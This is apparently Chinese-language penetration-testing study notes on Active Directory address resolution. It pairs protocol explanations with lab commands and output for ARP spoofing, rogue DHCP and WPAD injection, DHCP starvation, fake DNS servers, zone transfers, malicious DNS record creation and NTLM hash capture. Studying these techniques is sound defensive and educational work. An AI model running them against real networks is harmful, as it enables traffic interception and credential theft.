---
layout: article
title: Address resolution--AD from 0 to 0.9 part 4
mathjax: true
key: a00008
cover: /bkgs/3.jpg
modify_date: 2021-10-5
show_author_profile: true
excerpt_type: html
tag: 
- DC
- Pentest
mode: immersive
header:
  theme: dark
article_header:
  type: overlay
  theme: dark
  background_color: '#203028'
  background_image:
    gradient: 'linear-gradient(135deg, rgba(34, 139, 87 , .4), rgba(139, 34, 139, .4))'
    src: /docs/assets/images/cover3.jpg
---

这篇是AD from 0 to 0.9系列笔记的第四部分，主要是地址解析相关<!--more-->

原文： [Attacking Active Directory: 0 to 0.9](https://zer1t0.gitlab.io/posts/attacking_ad/#why-this-post) 

# Address resolution

地址解析能搞的事：

| Person-in-The-Middle  (PitM)                                 | 中间人blabal                                                 |
| ------------------------------------------------------------ | ------------------------------------------------------------ |
| [NTLM Relay](https://en.hackndo.com/ntlm-relay/)             | 用用户的 [NTLM](https://zer1t0.gitlab.io/posts/attacking_ad/#ntlm)认证重定向到目标服务器来access |
| [NTLM crack](https://0xdf.gitlab.io/2019/01/13/getting-net-ntlm-hases-from-windows.html) | 破解获得用户密码                                             |

机器用的地址有三种：

| MAC               | [MAC](https://en.wikipedia.org/wiki/MAC_address) (Media Control  Access)唯一，链路层，[it can be   changed](https://www.howtogeek.com/192173/HOW-AND-WHY-TO-CHANGE-YOUR-MAC-ADDRESS-ON-WINDOWS-LINUX-AND-MAC/)， 6 bytes like 01:df:67:89:a4:87，前3字节 [MAC ](https://gist.github.com/aallan/b4bb86db86079509e6159810ae9bd3e4)供应商，后三字节该供应商唯一标识 |
| ----------------- | ------------------------------------------------------------ |
| IP                |                                                              |
| Hostnames  主机名 | 用 [DNS](https://zer1t0.gitlab.io/posts/attacking_ad/#dns), [NetBIOS](https://zer1t0.gitlab.io/posts/attacking_ad/#netbios), [LLMNR](https://zer1t0.gitlab.io/posts/attacking_ad/#llmnr) or [mDNS](https://zer1t0.gitlab.io/posts/attacking_ad/#mdns). 来连接主机名和ip |

以下对找机器很重要

| Hostname-IP解析 | 映射主机名和ip有两种策略：  1.[DNS](https://zer1t0.gitlab.io/posts/attacking_ad/#DNS)，向中心服务器请求，  2. [NetBIOS](https://zer1t0.gitlab.io/posts/attacking_ad/#netbios), [LLMNR](https://zer1t0.gitlab.io/posts/attacking_ad/#llmnr) or [mDNS](https://zer1t0.gitlab.io/posts/attacking_ad/#mdns)，广播到其他节点，可以伪装发送回复 |
| --------------- | ------------------------------------------------------------ |
| IP-MAC解析      | 确认ip后需要mac来定位机器，[ARP](https://zer1t0.gitlab.io/posts/attacking_ad/#arp)，可以中间人 |
| ip配置          | 手配或 [DHCP](https://zer1t0.gitlab.io/posts/attacking_ad/#dhcp),可以指向DNS来攻击 |

## **ARP**

[ARP](https://en.wikipedia.org/wiki/Address_Resolution_Protocol) (Address Resolution Protocol)

```
                                                   .---.
                                                  /   /|
                                                 .---. |
                                       .-------> |   | '
                                       |         |   |/ 
                                       |         '---'  
   .---.                               |
  /   /|                               |           .---.
 .---. |    1) Who is 192.168.1.5?     |          /   /|
 |   | ' >-------->>-------------------.-------> .---. |
 |   |/                                |         |   | '
 '---'   <---------.                   |         |   |/ 
                   |                   |         '---'  
                   |                   |
                   |                   |           .---.
                   |                   |          /   /|
                   |                   '-------> .---. |
                   |                             |   | '
                   '-<<------------------------< |   |/ 
                     2)  I am 192.168.1.5        '---'  
                      (MAC 01:02:03:04:05:06)
```

### **ARP 欺骗**

ARP有缓存但是会监听变化

```shell
$ arp -n
Address                  HWtype  HWaddress           Flags Mask            Iface
192.168.1.101            ether   e4:fd:a1:09:bf:a1   C                     wlp1s0
192.168.1.1              ether   00:e0:4c:d8:ca:89   C                     wlp1s0
```

```
###ARP spoof attack
         1)  I am 192.168.1.1           1)    I am 192.168.1.101    
         (MAC de:ad:be:ef:13:37)        (MAC de:ad:be:ef:13:37)
     .--------------<<<------------. .------------->>>---------------.
     |                             | |                               |
     v                             ^ ^                               v
   .---.   2) To 192.168.1.1      .---.   3) To 192.168.1.1        .---.
  /   /| -------->>>--------->   /   /| -------->>>------------>  /   /|
 .---. |                        .---. |                          .---. |
 |   | '   5) To 192.168.1.101  |   | '   4) To 192.168.1.101    |   | '
 |   |/  <-------<<<----------  |   |/  <-------<<<------------- |   |/ 
 '---'                          '---'                            '---'  
192.168.1.101                   192.168.1.137                   192.168.1.1
e4:fd:a1:09:bf:a1            de:ad:be:ef:13:37              00:e0:4c:d8:ca:89
```

[ettercap](https://www.ettercap-project.org/), [bettercap](https://github.com/bettercap/bettercap), [arpspoof](https://github.com/smikims/arpspoof) or [arplayer ](https://github.com/Zer1t0/arplayer)来欺骗/投毒

```powershell
$ ./arplayer spoof -I wlp1s0 -vvv -F -b 192.168.1.101 192.168.1.1
Spoofing - telling 192.168.1.101 (e4:fd:a1:09:bf:a1) that 192.168.1.1 is 00:e0:4c:d8:ca:89 (192.168.1.107) every 1.0 seconds (until Ctrl-C)
INFO - 192.168.1.1-de:ad:be:ef:13:37 -> 192.168.1.101-e4:fd:a1:09:bf:a1
INFO - 192.168.1.101-de:ad:be:ef:13:37 -> 192.168.1.1-00:e0:4c:d8:ca:89
INFO - 192.168.1.1-de:ad:be:ef:13:37 -> 192.168.1.101-e4:fd:a1:09:bf:a1
INFO - 192.168.1.101-de:ad:be:ef:13:37 -> 192.168.1.1-00:e0:4c:d8:ca:89
INFO - 192.168.1.1-de:ad:be:ef:13:37 -> 192.168.1.101-e4:fd:a1:09:bf:a1
INFO - 192.168.1.101-de:ad:be:ef:13:37 -> 192.168.1.1-00:e0:4c:d8:ca:89
```

### **ARP Scan**

请求所有ip来看那些主机在线

```shell
$ ./arplayer scan -I wlp1s0 -w 10 -t 1000
192.168.1.1 00:e0:4c:d8:ca:89
192.168.1.101 e4:fd:a1:09:bf:a1
```

## **DHCP**

DHCP (Dynamic Host Configuration Protocol) ，用UDP，服务器67/UDP，要求客户端从68/UDP发消息

```
 client                         server
 -----.                        .-----
      |                        |
     ---.      .------.      .---
 68/UDP |>---->| DHCP |>---->| 67/UDP
     ---'      '------'      '---
      |                        |
 -----'                        '-----
```

新的客户端找DHCP来拿IP，四个步骤：

1.服务器发现：广播来请求IP

2.IP租赁提供：服务器也带着IP广播给客户端

3.IP租赁请求：客户端接受IP并发送信息请求

4.IP租赁确认：服务器确认客户端可以使用选定的IP，包括一些如续期时间等配置

通常简化流程为DORA (Discovery, Offer, Request, Acknowledge)，计算机加入网络时就出发，同时也能用`dhclient`（Linux）， `ipconfig /renew`（win）手动触发

```
  client        server
    |             |
    |  discovery  |
    | ----------> |
    |             |
    |    offer    |
    | <---------- |
    |             |
    |   request   |
    | ----------> |
    |             |
    | acknowledge |
    | <---------- |
    |             |
```

[many configuration options](https://linux.die.net/man/5/dhcp-options)里有一些有意思的：

| **Code** | **Name**                      |
| -------- | ----------------------------- |
| 3        | Gateway IP (Router)           |
| 6        | DNS server IP                 |
| 15       | Domain name                   |
| 44       | NetBIOS name (WINS) server IP |
| 54       | DHCP server IP                |
| 252      | WPAD configuration file       |

win ipconfig /all 网络配置

Linux 分散一些； /etc/resolv.conf 检查DNS服务器， ip route 拿默认网关

[dhcplayer](https://github.com/Zer1t0/dhcplayer#dhcp-server)或nmap 脚本 [broadcast-dhcp-discover ](https://nmap.org/nsedoc/scripts/broadcast-dhcp-discover.html)来检查DHCP设置，然而需要root/admin权限，因为源端口68要被用到

```shell
###DHCP options enumeration with nmap
root@debian10:~# nmap --script broadcast-dhcp-discover -e enp7s0
Starting Nmap 7.70 ( https://nmap.org ) at 2020-11-30 05:55 EST
Pre-scan script results:
| broadcast-dhcp-discover: 
|   Response 1 of 1: 
|     IP Offered: 192.168.100.7
|     DHCP Message Type: DHCPOFFER
|     Subnet Mask: 255.255.255.0
|     Renewal Time Value: 4d00h00m00s
|     Rebinding Time Value: 7d00h00m00s
|     IP Address Lease Time: 8d00h00m00s
|     Server Identifier: 192.168.100.2
|     WPAD: http://isalocal.contoso.local:80/wpad.dat\x00
|     Router: 192.168.100.2
|     Name Server: 192.168.100.2
|     Domain Name Server: 192.168.100.2
|     Domain Name: contoso.local\x00
|_    NetBIOS Name Server: 192.168.100.2
WARNING: No targets were specified, so 0 hosts scanned.
Nmap done: 0 IP addresses (0 hosts up) scanned in 0.52 seconds
```

除了枚举外DHCP还会被以下攻击：

DHCP starvation/exhaustion和Rogue DHCP server

### **Rogue DHCP server**

DHCP server可以设置：

- Gateway/router
- DNS servers
- NetBIOS/WINS name  servers
- WPAD （网络代理自发现协议 Web Proxy Auto-Discovery Protocol）

这样的话客户端就会发送DNS请求到恶意DNS服务器去，并转发到如假冒DC，可以用 [yersinia](https://github.com/tomac/yersinia) or [dhcplayer ](https://github.com/Zer1t0/dhcplayer#dhcp-server)来执行这些攻击

```shell
###(rogue) DHCP server with dhcplayer

$ dhcplayer server -I eth2 --wpad http://here.contoso.local/wpad.dat -v --domain contoso.local          
INFO - IP pool: 192.168.100.1-192.168.100.254
INFO - Mask: 255.255.255.0
INFO - Broadcast: 192.168.100.255
INFO - DHCP: 192.168.100.44
INFO - DNS: [192.168.100.44]
INFO - Router: [192.168.100.44]
INFO - WPAD: http://here.contoso.local/wpad.dat
INFO - Domain: contoso.local
INFO - REQUEST from 52:54:00:5d:56:b9 (debian10)
INFO - Requested IP 192.168.100.145
INFO - ACK to 192.168.100.145 for 52:54:00:5d:56:b9
INFO - REQUEST from 52:54:00:76:87:bb (ws01-10)
INFO - Requested IP 192.168.100.160
INFO - ACK to 192.168.100.160 for 52:54:00:76:87:bb
```

### **DHCP Starvation**

把DHCP地址请求完，然后自己搭一个，工具 [dhcpstarv](https://github.com/sgeto/dhcpstarv), [yersinia](https://github.com/tomac/yersinia) or [dhcplayer](https://github.com/Zer1t0/dhcplayer#starvation-attack)

```bash
###DHCP starvation attack with dhcpstarv

$ dhcpstarv -i enp7s0
08:03:09 11/30/20: got address 192.168.100.7 for 00:16:36:99:be:21 from 192.168.100.2
08:03:09 11/30/20: got address 192.168.100.8 for 00:16:36:25:1f:1d from 192.168.100.2
08:03:09 11/30/20: got address 192.168.100.9 for 00:16:36:c7:79:f2 from 192.168.100.2
08:03:09 11/30/20: got address 192.168.100.10 for 00:16:36:f4:c3:e9 from 192.168.100.2
```

**DHCP Discovery**

可以发送DISCOVER到网络中看能拿到什么信息，可以通过这种方式拿一些未授权信息，如域或服务器地址，一般是DC的信息。 

```shell
###Getting information from the DHCP server

$ dhcplayer discover -I eth2 -n

OFFER received from 192.168.100.2
Offered IP: 192.168.100.3
Client MAC: 52:54:00:88:80:0c
DHCP Server: 192.168.100.2
Options:
[1] Subnet Mask: 255.255.255.0
[58] Renewal Time: 345600
[59] Rebinding Time: 604800
[51] IP Address Lease Time: 691200
[54] DHCP Server ID: 192.168.100.2
[3] Router: 192.168.100.2
[5] Name Server: 192.168.100.2
[6] Domain Server: 192.168.100.2
[15] Domain Name: contoso.local
[44] NetBIOS Name Server: 192.168.100.2
[77] Unknow: [0, 14, 82, 82, 65, 83, 46, 77, 105, 99, 114, 111, 115, 111, 102]
[252] WPAD: http://isalocal.contoso.local:80/wpad.dat
```

### **DHCP Dynamic DNS**

可以让DHCP服务器根据DHCP请求中指示的客户端主机名[create custom DNS A records](https://www.trustedsec.com/blog/injecting-rogue-dns-records-using-dhcp/)（域名指向IPv4地址**），**客户端请求DNA A 记录更新，需要在DHCP请求包括 [Client FQDN (Fully Qualified Domain Name) ](https://datatracker.ietf.org/doc/html/rfc4702)选项并且将“S”标志设为1，更新完成的话服务器也会设置flag为1，这样客户端主机名和IP就绑在一起了，用[dhcplayer ](https://github.com/Zer1t0/dhcplayer#dns-dynamic-update)并设置--dns-update flag可以请求DNS更新

```powershell
###Default configuration of DHCP server
PS C:\> Get-DhcpServerv4DnsSetting
DynamicUpdates             : OnClientRequest
DeleteDnsRROnLeaseExpiry   : True
UpdateDnsRRForOlderClients : False
DnsSuffix                  :
DisableDnsPtrRRUpdate      : False
NameProtection             : False

###Dynamic DNS update with dhcplayer
$ dhcplayer discover -I eth2 --dns-update -H hira
ACK received from 0.0.0.0
Acquired IP: 192.168.100.121
Client MAC: 52:54:00:88:80:0c
Options:
[58] Renewal Time: 345600
[59] Rebinding Time: 604800
[51] IP Address Lease Time: 691200
[54] DHCP Server ID: 192.168.100.240
[1] Subnet Mask: 255.255.255.0
[81] Client FQDN: flags: 0x1 (server-update) A-result: 255 PTR-result: 0 
[3] Router: 192.168.100.240
[15] Domain Name: poke.mon
[6] Domain Server: 192.168.100.240,192.168.100.240,192.168.100.2
                                                                                                                
$ nslookup hira.poke.mon 192.168.100.240                                                               
Server:		192.168.100.240
Address:	192.168.100.240#53

Name:	hira.poke.mon
Address: 192.168.100.121
```

因为mac的原因一般同一个地址会一直给一个机器；有一些[DNS names ](https://www.netspi.com/blog/technical/network-penetration-testing/adidns-revisited/)被保留在DNS Global Query Block List (GQBL) ，如  `wpad` and `isatap`.

```powershell
###Get DNS Global Query Block List
PS C:\> Get-DnsServerGlobalQueryBlockList

Enable : True
List   : {wpad, isatap}
```

## **DNS**

### **DNS Basics**

DNS (Domain Name System)，定义计算机、服务和网络其他资源的层次名称的系统，是C/S协议，服务器监听**53**/UDP and 53/TCP

DNS将计算机的DNS名称解析为其IP地址

```
    client                     DNS server
    .---.   A hackliza.gal?     .---.
   /   /| ------------------>  /   /|
  .---. |                     .---. |
  |   | '   185.199.111.153   |   | '
  |   |/  <------------------ |   |/ 
```

DNS有很多 [different records](https://en.wikipedia.org/wiki/List_of_DNS_record_types)，例子：

| A                                | DNS名称映射到IPv4                                        |
| -------------------------------- | -------------------------------------------------------- |
| AAAA                             | 映射IPv6                                                 |
| CNAME规范名称   (Canonical Name) | 将别名映射到原始DNS名称                                  |
| DNAME                            | 映射DNS子树                                              |
| NS (Name  Server)                | 指示域的DNS服务器                                        |
| PTR  (Pointer)                   | 映射IP到DNS（反查）                                      |
| SOA (Start  of Authority)        | 包含有关DNS区域的管理信息，例如DNS主服务器或管理员的邮件 |
| SRV  (Service)                   | 服务的主机和端口                                         |

```shell
###Resolve DNS servers of wikipedia.org with dig
root@debian10:~$ dig NS wikipedia.org

; <<>> DiG 9.16.6-Ubuntu <<>> NS wikipedia.org
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 56753
;; flags: qr rd ra; QUERY: 1, ANSWER: 3, AUTHORITY: 0, ADDITIONAL: 1

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 65494
;; QUESTION SECTION:
;wikipedia.org.			IN	NS

;; ANSWER SECTION:
wikipedia.org.		6704	IN	NS	ns1.wikimedia.org.
wikipedia.org.		6704	IN	NS	ns0.wikimedia.org.
wikipedia.org.		6704	IN	NS	ns2.wikimedia.org.

;; Query time: 0 msec
;; SERVER: 127.0.0.53#53(127.0.0.53)
;; WHEN: jue dic 03 10:14:07 CET 2020
;; MSG SIZE  rcvd: 106
```

相关信息都在DNS服务器上（一般是在一个 [text file](https://docs.fedoraproject.org/en-US/Fedora/12/html/Deployment_Guide/s2-bind-zone-examples.html)）

### **DNS zones**

DNS分层结构，也是分区的，每个区独立管理blabal；每个区都有子区的记录（有自己区域的子域除外）； w ww.contoso.com  IP得去contoso.com找其DNS服务器

### **DNS exfiltration（过滤）**

通过这种方式，DNS协议可以成为[exfiltration mechanism](https://blogs.akamai.com/2017/09/introduction-to-dns-data-exfiltration.html)的优秀盟友，如果本地DNS服务器配置错误，并对internet上的其他DNS服务器执行递归DNS请求，这可能被滥用，以绕过防火墙规则并将数据发送到外部。 [iodine](https://github.com/yarrick/iodine) or [dnscat2](https://github.com/iagox86/dnscat2)

```
###Recursive DNS query
                             local recursive           fake.com authoritative
    client                     DNS server                   DNS server
    .---.                        .---.                        .---.         
   /   /|  websvr01.fake.com?   /   /|  websvr01.fake.com?   /   /|
  .---. | --------local------> .---. | ------internet-----> .---. |
  |   | '                      |   | '                      |   | '
  |   |/    40.113.200.201     |   |/    40.113.200.201     |   |/
  '---'   <------------------- '---'   <------------------- '---'
```

### **Fake DNS server**

[dnschef](irc:https://github.com/iphelix/dnschef) or [responder.py ](https://github.com/lgandx/Responder)设置假的DNS服务器

```bash
###Fake DNS server with dnschef
$ dnschef -i 192.168.100.44 --fakeip 192.168.100.44
          _                _          __  
         | | version 0.4  | |        / _| 
       __| |_ __  ___  ___| |__   ___| |_ 
      / _` | '_ \/ __|/ __| '_ \ / _ \  _|
     | (_| | | | \__ \ (__| | | |  __/ |  
      \__,_|_| |_|___/\___|_| |_|\___|_|  
                   iphelix@thesprawl.org  

(12:29:51) [*] DNSChef started on interface: 192.168.100.44
(12:29:51) [*] Using the following nameservers: 8.8.8.8
(12:29:51) [*] Cooking all A replies to point to 192.168.100.44
(12:38:32) [*] 192.168.100.7: proxying the response of type 'PTR' for 44.100.168.192.in-addr.arpa
(12:38:32) [*] 192.168.100.7: cooking the response of type 'A' for aaa.contoso.local to 192.168.100.44
(12:38:32) [*] 192.168.100.7: proxying the response of type 'AAAA' for aaa.contoso.local
```

### **DNS Zone Transfer**

将DNS服务器的所有记录复制到另一个DNS服务器。错误配置会让任何人都能执行DNS域传输；AD（通常也是DNS服务器）中复制记录不一定需要DNS域传输，但可以开启以复制给其他DNS服务器执行DNS域传输，

| lin  | dig axfr  <DNSDomainName> @<DCAddress>      |
| ---- | ------------------------------------------- |
| win  | interactive nslookup ls -d  <DNSDomainName> |

```bash
###Zone transfer from DC with dig
root@debian10:~# dig axfr contoso.local @dc01.contoso.local

; <<>> DiG 9.11.5-P4-5.1+deb10u2-Debian <<>> axfr contoso.local @dc01.contoso.local
;; global options: +cmd
contoso.local.		3600	IN	SOA	dc01.contoso.local. hostmaster.contoso.local. 156 900 600 86400 3600
contoso.local.		600	IN	A	192.168.100.3
contoso.local.		600	IN	A	192.168.100.2
contoso.local.		3600	IN	NS	dc01.contoso.local.
contoso.local.		3600	IN	NS	dc02.contoso.local.
_gc._tcp.Default-First-Site-Name._sites.contoso.local. 600 IN SRV 0 100 3268 dc02.contoso.local.
_gc._tcp.Default-First-Site-Name._sites.contoso.local. 600 IN SRV 0 100 3268 dc01.contoso.local.
_kerberos._tcp.Default-First-Site-Name._sites.contoso.local. 600 IN SRV	0 100 88 dc02.contoso.local.
......................stripped output..................
```

```bash
###Zone transfer from DC with nslookup
PS C:\> nslookup
Default Server:  UnKnown
Address:  192.168.100.2

> server dc01.contoso.local
Default Server:  dc01.contoso.local
Addresses:  192.168.100.2

> ls -d contoso.local
[UnKnown]
 contoso.local.                 SOA    dc01.contoso.local hostmaster.contoso.local. (159 900 600 86400 3600)
 contoso.local.                 A      192.168.100.3
 contoso.local.                 A      192.168.100.2
 contoso.local.                 NS     dc02.contoso.local
 contoso.local.                 NS     dc01.contoso.local
 _gc._tcp.Default-First-Site-Name._sites SRV    priority=0, weight=100, port=3268, dc02.contoso.local
 _gc._tcp.Default-First-Site-Name._sites SRV    priority=0, weight=100, port=3268, dc01.contoso.local
 _kerberos._tcp.Default-First-Site-Name._sites SRV    priority=0, weight=100, port=88, dc02.contoso.local
......................stripped output..................
```

### **Dump DNS records**

域传输没开启的话，也能用LDAP（DNS记录存AD数据库的），用[adidnsdump](https://github.com/dirkjanm/adidnsdump)或 [dns-dump.ps1](https://github.com/mmessano/PowerShell/blob/master/dns-dump.ps1)脚本

```bash
###Dumping DNS with adidnsdump
root@debian10:~# adidnsdump -u contoso\\Anakin contoso.local
Password: 
[-] Connecting to host...
[-] Binding to host
[+] Bind OK
[-] Querying zone for records
[+] Found 37 records

root@debian10:~# head records.csv 
type,name,value
A,WS02-7,192.168.100.7
A,ws01-10,192.168.100.6
A,WIN-LBB9AO5FA13,192.168.100.6
A,win-4l1775e9t3u,192.168.100.2
A,ForestDnsZones,192.168.100.3
A,ForestDnsZones,192.168.122.254
A,ForestDnsZones,192.168.100.2
A,ForestDnsZones,192.168.122.111
A,DomainDnsZones,192.168.100.3
```

### **ADIDNS**

ADIDNS (Active Directory Integrated DNS)，DC把DNS给集成了，解析的顺位如下：

1. DNS
2. mDNS
3. LLMNR
4. NBNS

DNS在AD有AD的优势例如加密存储以及自动同步等

DNS记录可以存在：

| DomainDnsZones 分区 | 此分区在域的DC中复制，可被LDAP获取，路径  CN=MicrosoftDNS,DC=DomainDnsZones,DC=<domainpart>,DC=<domainpart> |
| ------------------- | ------------------------------------------------------------ |
| ForestDnsZones      | 此分区在森林中所有域中复制，同上                             |
| 域分区              | 在老系统中，DNS记录存储在此分区中的位置，并将其复制到域的DC中。LDAP， CN=MicrosoftDNS,CN=System,DC=<domainpart>,DC=<domainpart> |

作为特性之一，ADIDNS 有[special SRV records](https://petri.com/active_directory_srv_records)，允许在网络中寻找特定资源，能通过一下SRV记录找DC：

- _gc._tcp.<DNSSDomainName>
- _kerberos._tcp.<DNSSDomainName>
- _kerberos._udp.<DNSSDomainName>
- _kpasswd._tcp.<DNSSDomainName>
- _kpasswd._udp.<DNSSDomainName>
- _ldap._tcp.<DNSSDomainName>
- _ldap._tcp.dc._msdcs.<DNSDomainName>

这些记录指向提供Global Catalog (_gc), Kerberos (_kerberos and _kpasswd) and LDAP (_ldap) 的AD服务器，即DC

| lin  | dig SRV  _ldap._tcp.dc.contoso.local                |
| ---- | --------------------------------------------------- |
| win  | nslookup -q=srv  _ldap._tcp.dc._msdcs.contoso.local |

```powershell
###DNS query to identify DCs with nslookup
PS C:\> nslookup -q=srv _ldap._tcp.contoso.local
Server:  ip6-localhost
Address:  ::1

_ldap._tcp.contoso.local        SRV service location:
          priority       = 0
          weight         = 100
          port           = 389
          svr hostname   = dc01.contoso.local
_ldap._tcp.contoso.local        SRV service location:
          priority       = 0
          weight         = 100
          port           = 389
          svr hostname   = dc02.contoso.local
dc01.contoso.local      internet address = 192.168.100.2
dc02.contoso.local      internet address = 192.168.100.6
```

解析域名 <DNSDomainName> 可能得到所有DC的ip；主（primary ）DC可以通过_ldap._tcp.pdc._msdcs.<DNSDomainName> 查找

### **DNS dynamic updates**

 [dynamic updates](https://www.ietf.org/rfc/rfc2136.txt)允许客户端create/modify/delete DNS records，AD中只允许安全的动态更新，即DNS记录被 [ACLs](https://zer1t0.gitlab.io/posts/attacking_ad/#acls)保护，且只有授权用户才能修改。

默认任何用户都能创建DNS记录并成为其拥有者且只有拥有者能更删记录。通过动态更新新疆记录用 [Invoke-DNSUpdate ](https://github.com/Kevin-Robertson/Powermad#invoke-dnsupdate)脚本

```powershell
###DNS update with Invoke-DNSUpdate
PS C:\> Invoke-DNSUpdate -DNSType A -DNSName test -DNSData 192.168.100.100 -Verbose
VERBOSE: [+] Domain Controller = dc01.contoso.local
VERBOSE: [+] Domain = contoso.local
VERBOSE: [+] Kerberos Realm = contoso.local
VERBOSE: [+] DNS Zone = contoso.local
VERBOSE: [+] TKEY name 676-ms-7.1-0967.05293487-9821-11e7-4051-000c296694e0
VERBOSE: [+] Kerberos preauthentication successful
VERBOSE: [+] Kerberos TKEY query successful
[+] DNS update successful
PS C:\> nslookup test
Server:  UnKnown
Address:  192.168.100.2

Name:    test.contoso.local
Address:  192.168.100.100
```

 [TSIG](https://www.ietf.org/rfc/rfc2845.txt) (Transaction Signature)协议来让DNS认证请求，需要C/S共享key来签名信息。在AD中用Kerberos协议获得key。

通配符记录，匹配所有没有记录的请求到某个地址，如果指向攻击者计算机可以 [perform PitM attacks](https://blog.netspi.com/exploiting-adidns/)

DNS可被LDAP CRUD， [Powermad](https://github.com/Kevin-Robertson/Powermad) and [dnstool.py ](https://github.com/dirkjanm/krbrelayx#dnstoolpy)来搞DNS记录。此技术也可以用 [Inveigh](https://github.com/Kevin-Robertson/Inveigh)来搜集NetNTLM 哈希。记得删除相关记录避免引起网络问题

DNS Global Query Block List (GQBL) 保护部分名字添加后被解析，默认是 wpad and isatap

```powershell
###Get DNS Global Query Block List
PS C:\> Get-DnsServerGlobalQueryBlockList


Enable : True
List   : {wpad, isatap}
```

更多相关动态更新和相关攻击链接

- [Beyond LLMNR/NBNS Spoofing -      Exploiting Active Directory-Integrated DNS](https://blog.netspi.com/exploiting-adidns/)
- [ADIDNS Revisited - WPAD, GQBL, and      More](https://blog.netspi.com/adidns-revisited/)

## **NetBIOS**

[NetBIOS](https://en.wikipedia.org/wiki/NetBIOS) (Network Basic Input/Output System),只能在当前网络（LAN）交流；

 [NBT](https://en.wikipedia.org/wiki/NetBIOS_over_TCP/IP) (NetBIOS over TCP/IP)协议，能在因特网使用；

NetBIOS 分成三个服务

```
                       .-----
                       |
     .------.        .---
     | NBNS |--UDP-->| 137
     '------'        '---
                       |   
    .-------.        .---
    | NBDGM |--UDP-->| 138
    '-------'        '---
                       |
    .-------.        .---
    | NBSSN |--TCP-->| 139
    '-------'        '---
                       |
```

| NetBIOS **Name Service** | 137/UDP,解析NetBIOS names  |
| ------------------------ | -------------------------- |
| NetBIOS **Datagram**     | UDP/138  传输信息；类似UDP |
| NetBIOS **Session**      | TCP/139  传输信息；类似TCP |

#### NetBIOS Datagram Service

NetBIOS数据报服务或NetBIOS-DGM或NBDGM类似于UDP。它用作需要无连接通信的应用程序协议的传输层。服务器将在UDP端口138中侦听。

#### NetBIOS Session Service

NetBIOS会话服务或NetBIOS-SSN或NBSSN类似于TCP。它可以用作面向连接的通信的传输。它使用139/TCP端口。

#### NetBIOS Name Service

渗透中应该关注NBNS 一些，NBNS 允许：

- 解析NetBIOS名为IP
- 知道NetBIOS节点状态
- 注册/释放NetBIOS名字

NetBIOS 与DNS名不同，不是分层的，只能在本地网络有用，名字16字节，前15大写存名字，最后一个表示资源类型如主机名，域名，文件服务等；

```powershell
###NetBIOS names of local computer
C:\Users\Anakin>nbtstat -n

Ethernet 2:
Node IpAddress: [192.168.100.10] Scope Id: []

                NetBIOS Local Name Table

       Name               Type         Status
    ---------------------------------------------
    WS01-10        <20>  UNIQUE      Registered
    WS01-10        <00>  UNIQUE      Registered
    CONTOSO        <00>  GROUP       Registered
```

nbtstat -n查看本地win机器NetBIOS名字，类型表如下

| **Number** | **Type** | **Usage**       |
| ---------- | -------- | --------------- |
| 00         | UNIQUE   | Hostname        |
| 00         | GROUP    | Domain name     |
| 01         | GROUP    | Master Browser  |
| 1D         | UNIQUE   | Master Browser  |
| 1E         | GROUP    | Browser service |
| 20         | UNIQUE   | File server     |

NBNS 协议被巨硬作为[WINS](https://web.archive.org/web/20031010135027/http:/www.neohapsis.com:80/resources/wins.htm#sec4sub4sub4) (Windows Internet Name Service)应用；一台win有一个WINS数据库存网络资源，包括netbios and domain (or workgroup)名字；且win服务器能被设置为像DNS一样的解析NetBIOS的服务器 

因此解析NetBIOS名字可以找WINS服务器解析；或者广播；当Netbios名被用于连接另一台机器时NBNS 名才会解析，如 net view [\\name](file://name) ； lin上 [nmblookup ](https://www.samba.org/samba/docs/current/man-html/nmblookup.1.html)来解析

要注意的是，广播的时候任何电脑都可以回应，[responder.py](https://github.com/lgandx/Responder) and [Inveigh ](https://github.com/Kevin-Robertson/Inveigh)可以搜集NTLM哈希

解析顺位

1. DNS
2. mDNS
3. LLMNR
4. NBNS

如果知道NetBIOS节点可以直接询问来请求服务，win‘可以用[nbtstat](https://docs.microsoft.com/es-es/windows-server/administration/windows-commands/nbtstat)命令

```powershell
###Resolving hostname and services with ntbstat
C:\Users\Anakin>nbtstat -A 192.168.100.4

Ethernet 2:
Node IpAddress: [192.168.100.3] Scope Id: []

           NetBIOS Remote Machine Name Table

       Name               Type         Status
    ---------------------------------------------
    WS02-7         <00>  UNIQUE      Registered
    CONTOSO        <00>  GROUP       Registered
    WS02-7         <20>  UNIQUE      Registered
    CONTOSO        <1E>  GROUP       Registered
    CONTOSO        <1D>  UNIQUE      Registered
    ☺☻__MSBROWSE__☻<01>  GROUP       Registered

    MAC Address = 52-54-00-A4-8C-F2
```

可以利用这个来实施NetBIOS扫描并发现机器和服务，[nbtscan](http://www.unixwiz.net/tools/nbtscan.html) or nmap script [nbtstat.nse](https://nmap.org/nsedoc/scripts/nbstat.html), lin/win都行

```powershell
###NetBIOS scan with nbtscan
root@debian10:~# nbtscan 192.168.100.0/24
192.168.100.2   CONTOSO\DC01                    SHARING DC
192.168.100.7   CONTOSO\WS02-7                  SHARING
*timeout (normal end of scan)
```

(proxychains没法用这个，因为proxychains不重定向UDP连接)

NBNS 也允许 NetBIOS 节点注册释放他们的名字，节点连接网络时会发送注册信息到WINS服务器，不成功则广播，离开时也一样但不常见。

注意： NBNS/WINS被认为是过时协议因此不鼓励使用，但很多机器还是默认开启了

## **LLMNR**

[LLMNR](https://en.wikipedia.org/wiki/Link-Local_Multicast_Name_Resolution) (Link-Local Multicast Name Resolution)，类似去中心化的DNS服务，但是只能在本地网络，发不出路由器，vista开始就有了，顺位表3号：

1. DNS
2. mDNS
3. LLMNR
4. NBNS

```
            .---
 LLMNR ---> | 5355/UDP
            '---
```

服务监听**5355**/UDP，客户端发送LLMNR 请求到组播地址224.0.0.252 (FF02:0:0:0:0:0:1:3 in IPv6)，查询不一定是名字，可以是DNS支持的任何内容。

同样的，查询时被叫道名字的机器会回应，即任何机器都能回应，在win机器上使用[responder.py](https://github.com/lgandx/Responder) and [Inveigh ](https://github.com/Kevin-Robertson/Inveigh)来搜集NTLM哈希

## **mDNS**

[mDNS](https://en.wikipedia.org/wiki/Multicast_DNS) (multicast DNS)，和LLMNR类似也是分布式的应用协议，基于DNS可以解析本地网络名称，同样不能过路由，win10中出现，顺位表4号:)

1. DNS
2. mDNS
3. LLMNR
4. NBNS

```
            .---
 mDNS ---> | 5353/UDP
            '---
```

**5353**/UDP,客户端送mDNS查询到组播地址224.0.0.251 (FF02::FB in IPv6)，支持DNS支持的传输内容。

## **WPAD**

